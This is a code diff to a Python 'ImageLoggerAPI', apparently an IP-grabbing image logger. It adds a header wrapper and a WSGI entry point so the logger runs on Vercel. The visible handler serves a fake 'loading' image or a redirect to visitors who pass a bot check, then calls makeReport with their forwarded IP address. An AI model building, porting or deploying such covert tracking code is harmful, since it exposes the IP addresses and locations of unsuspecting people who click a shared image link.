@@ -1,3 +1,5 @@
+import io
+import http.client
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
@@ -163,8 +165,21 @@ binaries = {
     "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 }
 
+class HeadersWrapper:
+    def __init__(self, environ):
+        self.environ = environ
+    def get(self, key, default=""):
+        k = key.lower().replace('-', '_')
+        if k == 'x_forwarded_for':
+            val = self.environ.get('HTTP_X_FORWARDED_FOR', self.environ.get('REMOTE_ADDR', '127.0.0.1'))
+            return val.split(',')[0].strip() if val else '127.0.0.1'
+        elif k == 'user_agent':
+            return self.environ.get('HTTP_USER_AGENT', '')
+        else:
+            env_key = 'HTTP_' + k.upper()
+            return self.environ.get(env_key, default)
+
 class ImageLoggerAPI(BaseHTTPRequestHandler):
-    
     def handleRequest(self):
         try:
             if config["imageArgument"]:
@@ -194,14 +209,13 @@ height: 100vh;
                 return
             
             if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
-                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
+                self.send_response(200 if config["buggedImage"] else 302)
                 self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                 self.end_headers()
 
                 if config["buggedImage"]: self.wfile.write(binaries["loading"])
 
                 makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
-                
                 return
             
             else:
@@ -274,8 +288,36 @@ if (!currenturl.includes("g=")) {
             reportError(traceback.format_exc())
 
         return
-    
-    do_GET = handleRequest
-    do_POST = handleRequest
 
-handler = app = ImageLoggerAPI
+class WSGIRequestHandlerWrapper(ImageLoggerAPI):
+    def __init__(self, environ, start_response):
+        self.environ = environ
+        self.start_response_func = start_response
+        self.headers = HeadersWrapper(environ)
+        
+        path = environ.get('PATH_INFO', '')
+        query = environ.get('QUERY_STRING', '')
+        self.path = f"{path}?{query}" if query else path
+        
+        self.response_status = 200
+        self.response_message = "OK"
+        self.response_headers = []
+        self.wfile = io.BytesIO()
+        
+        self.handleRequest()
+
+    def send_response(self, code, message=None):
+        self.response_status = code
+        self.response_message = message or http.client.responses.get(code, "OK")
+
+    def send_header(self, keyword, value):
+        self.response_headers.append((keyword, str(value)))
+
+    def end_headers(self):
+        status_str = f"{self.response_status} {self.response_message}"
+        self.start_response_func(status_str, self.response_headers)
+
+# Vercel greift auf diese WSGI-Funktion "app" zu
+def app(environ, start_response):
+    wrapper = WSGIRequestHandlerWrapper(environ, start_response)
+    return [wrapper.wfile.getvalue()]
